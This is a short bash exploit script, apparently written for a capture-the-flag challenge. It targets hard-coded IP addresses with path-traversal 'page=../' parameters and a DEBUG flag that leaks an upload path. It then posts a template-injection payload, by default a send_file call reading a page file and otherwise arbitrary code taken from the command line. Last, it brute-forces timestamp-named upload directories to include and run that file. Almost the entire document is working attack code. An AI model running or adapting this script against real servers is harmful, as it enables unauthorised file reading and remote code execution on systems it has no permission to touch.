#!/bin/bash

#server='http://107.189.94.25/';
#server='http://107.189.94.252/';
#server='http://107.189.94.253/';
server='http://107.189.94.255/';

payload='<@ send_file("../pages/about"); @>'
range=1

if [[ "$#" -gt 0 ]];
then
	payload='<@ '"$1"' @>'
fi

ltime_start=$(date +%s);
sample=`curl -v "$server" -d "page=../www/index&DEBUG=on" 2>/dev/null | grep POST_PATH`;
#sample='<!-- POST_PATH = /uploads/AF82705010194//datadb74014.0 -->'; sleep 2;
echo "'$sample'";
regex='^<!-- POST_PATH = \/uploads\/([^\/]*)\/+([^\s]*) -->$';
if [[ $sample =~ $regex ]]; 
then 
  stime=${BASH_REMATCH[1]};
  sfile=${BASH_REMATCH[2]};
  sfilename="${sfile%.*}";
  sfileext="${sfile##*.}";
  ltime_stop=$(date +%s);
  ltime_diff=$(($ltime_stop-$ltime_start));
  #for i in {15..25}; do time=`python -c 'import sys;base=0x'$stime';sys.stdout.write("%X" % (base+'$i'));'`; curl -v "http://107.189.94.252/?DEBUG=on&page=../uploads/$time/$sfile" > "$time.html"; done
  curl -v "$server" -d "page=../www/index&DEBUG=on&$payload" 2>/dev/null >/dev/null &
  for i in $(seq $(($ltime_diff-$range)) $(($ltime_diff+$range))); do 
	time=`python -c 'import sys;base=0x'$stime';sys.stdout.write("%X" % (base+'$i'));'`; 
	output=`curl -v "$server?DEBUG=on&SCRIPT_EXT=.$sfileext&page=../uploads/$time/$sfilename" 2>/dev/null #> "$time.html"`;
	v=
	echo
	while IFS='' read -r line; do
		if [[ "$line" == "				</div>" ]]; then v=; fi;
		if [[ $v ]]; then echo -e "$line"; fi;
		if [[ "$line" == "page=../www/index&DEBUG=on&" ]]; then v=true; fi;
	done <<< "$output"
  done;
else 
  echo "Not propper format"; 
fi